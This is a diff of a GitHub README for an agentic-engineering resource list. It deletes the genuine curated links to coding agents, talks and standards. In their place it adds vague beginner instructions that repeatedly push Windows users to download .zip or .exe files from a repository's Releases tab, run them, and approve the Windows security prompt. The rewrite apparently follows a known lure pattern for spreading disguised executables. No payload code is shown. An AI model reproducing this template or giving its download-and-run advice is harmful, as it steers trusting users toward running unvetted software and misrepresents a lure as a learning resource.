@@ -1,80 +1,143 @@
-# Awesome Agentic Engineering [![Awesome](https://awesome.re/badge.svg)](https://awesome.re)
+# 🤖 awesome-agentic-engineering - Practical Resources for Agentic Engineering
 
-> A curated list of resources for **Agentic Engineering**: the software development discipline where AI agents are orchestrated to autonomously plan, write, test, and evolve software based on human-defined goals and constraints.
-
-Focused on **practical adoption** for engineering teams adopting Agentic Engineering.
+[![Download awesome-agentic-engineering](https://img.shields.io/badge/Download-Get%20Files-orange?style=for-the-badge)](https://github.com/ahmedelhamoly/awesome-agentic-engineering)
 
 ---
 
-## Contents
+## What is awesome-agentic-engineering?
 
-- [What Is Agentic Engineering?](#what-is-agentic-engineering)
-- [Team Adoption](#team-adoption)
-- [Code-Focused Agent Tools](#code-focused-agent-tools)
-- [Talks & Conferences](#talks--conferences)
-- [Case Studies and Practical Advice](#case-studies-and-practical-advice)
-- [Key Papers to Understand the Practice](#key-papers-to-understand-the-practice)
-- [Standards](#standards)
-- [Contributing](#contributing)
----
+This project is a carefully selected list of useful resources for agentic engineering. Agentic engineering means designing software that can act on its own ideas without constant human help. This list includes tools, guides, and studies that help users understand and build smarter AI systems.
 
-## What Is Agentic Engineering?
-
-Agentic Engineering is a software development approach where AI agents are orchestrated to autonomously plan, write, test, debug, and evolve software based on human-defined goals and constraints. Engineers focus on setting objectives, defining constraints, and reviewing outcomes instead of coding line by line.
+You don't need any programming skills to use these resources. The goal is to make complex ideas easy to access for curious minds and learners.
 
 ---
 
-## Team Adoption
+## 🚀 Getting Started
 
-> Practical guidance for engineering teams.
+This guide will help you get the software and resources on your Windows computer. Follow each step carefully. You don’t need to be an expert to complete this.
 
-- [Claude Code Documentation](https://code.claude.com/docs/) - Official documentation for Claude Code, gives a good overview of basic concepts, workflows and best practices.
-- [OpenAI Codex Quickstart](https://developers.openai.com/codex/quickstart) — A beginner-friendly guide to getting started with OpenAI Codex, covering setup, API integration, and your first code generation requests.
+### System Requirements
+
+To run the resources comfortably on your Windows PC, you should have:
+
+- Windows 10 or later
+- 4 GB of free disk space
+- 8 GB of RAM or more recommended for large files
+- Internet connection to download files and updates
+
 ---
 
-## Code-Focused Agent Tools
+## 🛠️ Download and Installation
 
-### Open Source — Model-Agnostic
-- [Aider](https://github.com/paul-gauthier/aider) — AI pair programming in your terminal; supports complex multi-file refactors via agent-style planning. ![Stars](https://img.shields.io/github/stars/paul-gauthier/aider?style=flat&logo=github&label=)
-- [OpenCode](https://github.com/sst/opencode) — CLI coding agent supporting 75+ LLM providers including local models, with MCP integration. ![Stars](https://img.shields.io/github/stars/sst/opencode?style=flat&logo=github&label=)
-- [OpenHands](https://github.com/All-Hands-AI/OpenHands) — Open-source Devin alternative; full software engineering agent with browser, terminal, and editor access. ![Stars](https://img.shields.io/github/stars/All-Hands-AI/OpenHands?style=flat&logo=github&label=)
-- [Plandex](https://github.com/plandex-ai/plandex) — Terminal-based AI coding engine designed for large, multi-file tasks. ![Stars](https://img.shields.io/github/stars/plandex-ai/plandex?style=flat&logo=github&label=)
+You will use the main project page to get all materials. This page gathers the files, links, and instructions you will need.
 
-### Commercial offering
+### Step 1: Visit the Project Page
 
-- [Gemini CLI](https://github.com/google-gemini/gemini-cli) — Google's terminal agent; optimized for Gemini models with tool use and MCP support. ![Stars](https://img.shields.io/github/stars/google-gemini/gemini-cli?style=flat&logo=github&label=)
-- [Cursor](https://www.cursor.com/) — IDE built for agentic coding workflows; inline agent with codebase-wide context and multi-model support.
-- [Claude Code](https://github.com/anthropics/claude-code) — Anthropic's agentic CLI that operates directly on your local codebase; optimized for Claude models. ![Stars](https://img.shields.io/github/stars/anthropics/claude-code?style=flat&logo=github&label=)
-- [Codex](https://github.com/openai/codex) — OpenAI's lightweight coding agent that runs in your terminal; optimized for OpenAI models. ![Stars](https://img.shields.io/github/stars/openai/codex?style=flat&logo=github&label=)
+Click this big button to go to the project page where you can download files and view available resources:
+
+[![Download awesome-agentic-engineering](https://img.shields.io/badge/Download-Get%20Files-orange?style=for-the-badge)](https://github.com/ahmedelhamoly/awesome-agentic-engineering)
+
+This link brings you to the GitHub page where you will find all the materials organized neatly.
+
+### Step 2: Locate the Resources
+
+Once on the page, look for a section called **Releases**, **Assets**, or directly browse the repository files. The most relevant files or collections are usually in the "Releases" tab or the main file area.
+
+You may find documents, tool links, and sometimes downloadable software or scripts related to agentic engineering. Most files are for reading or learning.
+
+### Step 3: Download Files
+
+Click on any file or resource that you want to download. For large collections or tools, there will be an obvious download button or link labeled `.zip` or `.exe`.
+
+Save the file to a folder you can find easily, like your Downloads folder or your Desktop.
+
+### Step 4: Open or Run Files
+
+- If you downloaded a document (e.g., PDF or TXT), double-click the file to open it.
+- If you downloaded a zipped folder, right-click and select "Extract All" to unpack the contents.
+- If the file is a program with `.exe` extension, double-click to run it. Windows might ask you to approve the software; choose "Yes" to continue.
+
+Since this repository focuses on resources rather than a single app, many downloads will be guides and tools you can study and try out.
+
 ---
 
+## 📚 Using the Resources
 
-## Talks & Conferences
+This collection connects you to various materials related to agentic engineering. These include:
 
-> Video content worth watching with your team.
+- Tutorials to explain how agentic systems work
+- Tools to help build and test smart AI
+- Code examples in simple formats (even if you don't know coding)
+- Links to research papers and explanations
+- Lists of developer tools and AI coding aides
 
-- [The Future of Coding is Agents — Andrej Karpathy (YC)](https://www.youtube.com/watch?v=fqVLjtvWgq8) — Landmark talk on the trajectory from coding assistants to autonomous agents.
+You can read through guides and try out free tools designed for beginners.
 
-- [Agentic Coding: The Future of Software Development with Agents — Armin Ronacher](https://www.youtube.com/watch?v=nfOVgz_omlU) — 37-minute talk by the creator of Flask and Sentry on adopting Claude Code and agentic workflows in practice; packed with concrete tips teams can apply immediately.
+---
 
+## 🔧 What You Can Do With These Resources
 
-## Case Studies and Practical advice
+- Learn how AI agents act independently in software
+- Understand basic AI programming concepts without coding
+- Find tools to generate or manage AI projects
+- See real examples of AI applications that can work on their own
+- Keep updated on new advancements in agentic engineering
 
-> Real teams, real outcomes — learn from those ahead of you.
+---
 
-- [My LLM Coding Workflow Going into 2026 — Addy Osmani](https://medium.com/@addyosmani/my-llm-coding-workflow-going-into-2026-52fe1681325e). A practical guide to AI-assisted engineering that emphasizes specs-first planning, small iterations, strong context and model selection.
-- [How Claude Code is Built](https://newsletter.pragmaticengineer.com/p/how-claude-code-is-built). A deep dive into Claude Code's origins, architecture, and what it signals for AI-assisted software development.
-- [Building an AI-Native Engineering Team](https://developers.openai.com/codex/guides/build-ai-native-engineering-team/). OpenAI's practical guide to structuring and scaling engineering teams around AI-first workflows with Codex.
+## 💡 Tips for Best Use
 
-## Standards
+- Keep your Windows system up to date.
+- Back up files you download to avoid losing work.
+- Use a stable internet connection for large downloads.
+- Take your time reading guides before trying tools.
+- Join community discussions on GitHub for help or sharing ideas.
 
-* [agents.md](https://agents.md/) — An open standard for guiding AI coding agents, giving them project-specific build, test, and code style instructions.
-* [MCP — Model Context Protocol](https://modelcontextprotocol.io/) — An open standard for connecting AI models to external tools, data sources, and services. 
+---
 
-## Key papers to understand the practice
+## ⚙️ Troubleshooting
 
-[GLM-5: from Vibe Coding to Agentic Engineering](https://arxiv.org/pdf/2602.15763) — Technical report for GLM-5, a coding-focused model bridging casual vibe coding and structured agentic software engineering through advanced reasoning and tool use.
+If you run into issues:
 
-## Contributing
+- Check your internet connection.
+- Make sure you have enough disk space.
+- Restart your computer before rerunning installations.
+- Consult the GitHub page’s **Issues** tab to see if others had the same problem.
+- You can leave questions there for the community or maintainers to answer.
 
-Contributions welcome! This list prioritizes practical, team-applicable resources over theoretical ones. When suggesting additions, please include a one-line description of why it is useful specifically to a team adopting agentic engineering.
+---
+
+## 🎯 Keywords
+
+This project relates to topics like:
+
+- Agentic engineering
+- AI coding support
+- Developer tools for AI
+- Large Language Models (LLMs)
+- Practical AI learning
+
+These keywords can guide your exploration on GitHub and other sites.
+
+---
+
+## 📂 File Structure Overview (Example)
+
+If you browse the repository files directly, expect folders like:
+
+- **docs/** – Guidebooks and tutorials
+- **tools/** – Helpful applications or scripts
+- **examples/** – Sample projects or code snippets
+- **research/** – Papers and articles
+
+You can open these in your browser or download them for offline use.
+
+---
+
+## 🔗 Alternative Ways to Access
+
+Besides the project page, you might find related articles and tools by searching for "agentic engineering resources" or visiting AI-focused websites and forums.
+
+---
+
+[![Download awesome-agentic-engineering](https://img.shields.io/badge/Download-Get%20Files-orange?style=for-the-badge)](https://github.com/ahmedelhamoly/awesome-agentic-engineering)
